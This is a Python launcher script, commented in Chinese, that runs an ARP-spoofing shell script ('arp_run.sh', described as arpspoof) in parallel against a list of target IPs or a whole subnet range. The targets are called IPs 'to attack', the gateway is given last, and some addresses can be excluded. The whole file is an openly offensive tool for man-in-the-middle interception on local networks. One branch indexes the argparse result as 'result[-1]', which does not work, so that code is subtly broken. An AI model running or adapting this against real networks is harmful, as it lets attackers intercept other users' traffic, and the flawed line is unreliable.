import subprocess
import argparse


def getArgsList():
    # 依次传入多个 target IP，最后一个是网关 IP
    parser = argparse.ArgumentParser(description="传参")
    # 要攻击的ip 最后写网关
    parser.add_argument('-l', type=str, nargs="+", help='runHostIP', required=False)
    # 网卡名称
    parser.add_argument('-i', type=str, help='interfaceName', required=False)
    # 网段 写了-l不执行 格式 192.168.1.1-192.168.1.253
    parser.add_argument('-n', type=str, help='ip-ip', required=False)
    # n的网关 写了n网段必写
    parser.add_argument('-r', type=str, help='ip-ip-RouteIP', required=False)
    # n的排除ip
    parser.add_argument('-s', type=str, nargs="+", help='notRunIP', required=False)
    #
    parser.add_argument('-f', type=str, help='shFileName', required=False)
    return parser.parse_args()

# 获取命令行参数
result = getArgsList()
try:
    if not result.n:
        processes = []
        for targetIP in result.l[:-1]:
            # 以异步方式运行 arpspoof
            proc = subprocess.Popen(['bash', result.f or 'arp_run.sh', targetIP, result[-1], result.i or 'eth0'])
            processes.append(proc)

        for proc in processes:
            # 等待所有的 arpspoof 进程完成
            proc.wait()
    else:
        netResult  = result.n.split('-')
        processes = []
        for targetIP in range(int(netResult[0].split('.')[-1]), int(netResult[1].split('.')[-1]) + 1):
            # 以异步方式运行 arpspoof
            if netResult[0][:-len(netResult[0].split('.')[-1])] + str(targetIP) in (result.s or []):
                continue
            # print(netResult[0][:-len(netResult[0].split('.')[-1])] + str(targetIP))
            proc = subprocess.Popen(['bash', result.f or 'arp_run.sh', netResult[0][:-len(netResult[0].split('.')[-1])] + str(targetIP), result.r, result.i or 'eth0'])
            processes.append(proc)

        for proc in processes:
            # 等待所有的 arpspoof 进程完成
            proc.wait()
except Exception as e:
    print(e)